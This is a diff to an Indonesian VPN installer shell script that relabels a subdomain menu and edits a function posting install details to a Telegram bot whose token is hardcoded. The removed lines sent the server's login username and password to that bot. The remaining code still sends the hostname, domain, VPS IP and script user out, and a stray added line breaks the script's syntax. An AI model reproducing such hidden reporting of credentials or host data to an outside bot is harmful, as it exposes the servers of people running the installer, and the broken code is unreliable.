@@ -302,8 +302,8 @@ clear
     echo -e "   .----------------------------------."
 echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
 echo -e "   '----------------------------------'"
-echo -e "     \e[1;32m1)\e[0m DOMAIN KAMU"
-echo -e "     \e[1;32m2)\e[0m DOMAIN YANG PUNYA SC"
+echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
+echo -e "     \e[1;32m2)\e[0m Random Subdomain"
 echo -e "   ------------------------------------"
 read -p "   Please select numbers 1-2 or Any Button(Random) : " host
 echo ""
@@ -344,7 +344,8 @@ function password_default() {
     KEY="6571846319:AAFaNBSeRHOmAG2jRLCMUAqo9EuC9XiW420"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="Installasi VPN Script
+    ============================
+    TEXT="Installasi Script RMBL vpn
     ============================
     <code>Tanggal    :</code> <code>$tanggal</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
@@ -357,8 +358,6 @@ function password_default() {
     ============================
     <code>Domain     :</code> <code>$domain</code>
     <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>User Login :</code> <code>$Username</code>
-    <code>Pass Login :</code> <code>$Password</code>
     <code>User Script:</code> <code>$username</code>
     <code>Exp Script :</code> <code>$exp</code>
     ============================
